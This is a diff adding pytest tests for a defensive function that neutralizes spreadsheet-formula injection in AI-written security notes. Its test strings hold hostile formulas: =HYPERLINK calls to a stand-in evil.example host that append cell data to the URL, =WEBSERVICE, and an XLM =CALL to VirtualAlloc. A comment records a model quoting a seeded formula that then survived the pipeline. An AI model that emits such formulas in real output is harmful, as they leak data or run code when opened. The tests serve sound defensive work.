@@ -254,3 +254,46 @@ def test_multiline_note_with_signed_bullets_unchanged():
     note = ("Findings:\n- user p.mensah (finance) flagged\n"
             "- risk score -5 (down from 70)\n- no lateral movement")
     assert N.neutralize_output(note)[0] == note
+
+
+# --- Mid-line (prose-position) formulas -- the 2026-08-18 full-gate a10 landing (1/5) ---------------
+# The model QUOTED the seeded formula mid-line ("username field: =HYPERLINK(...)") -- a position the
+# cell-scoped passes deliberately skip -- and the fireable marker survived the pipeline. Unlike a bare
+# URL, a verbatim formula string re-arms on copy-paste / CSV re-celling, so mid-line occurrences of
+# KNOWN dangerous functions are quote-prefixed and their line's URLs defanged.
+
+@pytest.mark.parametrize("line", [
+    'The username field contained: =HYPERLINK("https://evil.example/x?c="&A1,"click to verify")',
+    'Payload observed: `=HYPERLINK("https://evil.example/x")` in the username field.',
+    '- username: =HYPERLINK("https://evil.example/x")',
+    'field: =hyperlink("https://evil.example/x")',                  # spreadsheet functions are case-insensitive
+    'note: =WEBSERVICE ("https://evil.example/api")',               # space before ( still calls
+    'seen: =CALL("Kernel32","VirtualAlloc","J")',                   # XLM macro function, no-space form
+])
+def test_mid_line_dangerous_formula_neutralized(line):
+    """A known-dangerous formula quoted mid-prose is quote-prefixed and its URL defanged -- the a10
+    fireable marker (=NAME( + live scheme) must not survive the pipeline."""
+    out = N.neutralize_output(line)[0]
+    assert "'=" in out or "'=".upper() in out.upper()               # quote-prefixed at the formula
+    assert "https://evil.example" not in out                        # live URL defanged on that line
+
+
+@pytest.mark.parametrize("prose", [
+    "score =high(ish) today",                # generic =name( is NOT on the mid-line allowlist
+    "on-call (rotation) starts Monday",      # hyphen-glued sign + English-word function name
+    "the on-CALL (primary) analyst",
+    "auto-exec (enabled) by default",
+    "please re-register (the webhook)",
+    "we should exec (execute) the plan",     # no sign character at all
+    "call (555) 123-4567",
+])
+def test_mid_line_prose_not_quoted(prose):
+    """Do no harm: mid-line neutralization requires a KNOWN dangerous function name, an unglued sign,
+    and (for English-word function names) the paren attached -- everyday SOC prose passes verbatim."""
+    assert N.neutralize_output(prose)[0] == prose
+
+
+def test_mid_line_neutralization_is_idempotent():
+    line = 'field: =HYPERLINK("https://evil.example/x")'
+    once = N.neutralize_output(line)[0]
+    assert N.neutralize_output(once)[0] == once
